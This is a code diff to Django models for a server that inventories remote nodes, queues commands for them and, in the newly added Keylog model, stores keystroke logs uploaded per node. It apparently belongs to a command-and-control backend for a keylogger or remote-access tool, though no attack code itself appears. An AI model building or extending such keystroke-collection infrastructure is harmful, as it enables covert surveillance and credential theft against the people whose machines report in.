@@ -3,9 +3,15 @@ from django.utils import timezone
 import datetime
 
 
+def get_path(instance, filename):
+    return f'nodes/{instance.node.uuid}/keylogs/{timezone.now()}.log'
+
+
 # Node related models
 class Node(models.Model):
     # Connection Info
+    uuid = models.CharField(max_length=128, unique=True,
+                            null=False, blank=False)
     hash_sum = models.CharField(max_length=512, unique=True)
     host_name = models.CharField(max_length=512)
     ipv4 = models.GenericIPAddressField(protocol='IPv4', null=True, blank=True)
@@ -18,11 +24,19 @@ class Node(models.Model):
     os_version = models.CharField(max_length=512)
     device = models.CharField(max_length=512)
     processor = models.CharField(max_length=512)
+    processor_cores = models.IntegerField(null=True, blank=True)
     min_freq = models.FloatField()
     max_freq = models.FloatField()
+    memory_total = models.IntegerField(null=True, blank=True)
+
+    # Realtime info
+    processor_freq = models.FloatField(null=True, blank=True)
+    processor_temp = models.FloatField(null=True, blank=True)
+    processor_usage = models.FloatField(null=True, blank=True)
+    memory_usage = models.IntegerField(null=True, blank=True)
 
     def __str__(self):
-        return f'{self.host_name}:{self.hash_sum}'
+        return self.uuid
 
     # if node has contacted server in last two hours, set as active
     def is_active(self):
@@ -41,7 +55,7 @@ class Disk(models.Model):
                              on_delete=models.CASCADE)
 
     def __str__(self):
-        return f'{self.node.host_name}:{self.disk_name}'
+        return f'{self.node.uuid}:{self.disk_name}'
 
 
 class Partition(models.Model):
@@ -87,6 +101,20 @@ class Command(models.Model):
 
     def __str__(self):
         if self.node:
-            return f'{self.node.host_name}:{self.command}'
+            return f'{self.node.uuid}:{self.command}'
         else:
             return f'{self.group}:{self.command}'
+
+
+class Keylog(models.Model):
+    node = models.ForeignKey(
+        Node, related_name='keylogs', on_delete=models.CASCADE)
+
+    log = models.TextField()
+    timestamp = models.DateTimeField(auto_now_add=True)
+
+    log_file = models.FileField(
+        upload_to=get_path, null=True, blank=True, max_length=512)
+
+    def __str__(self):
+        return f'{self.node.uuid}:{self.timestamp}'
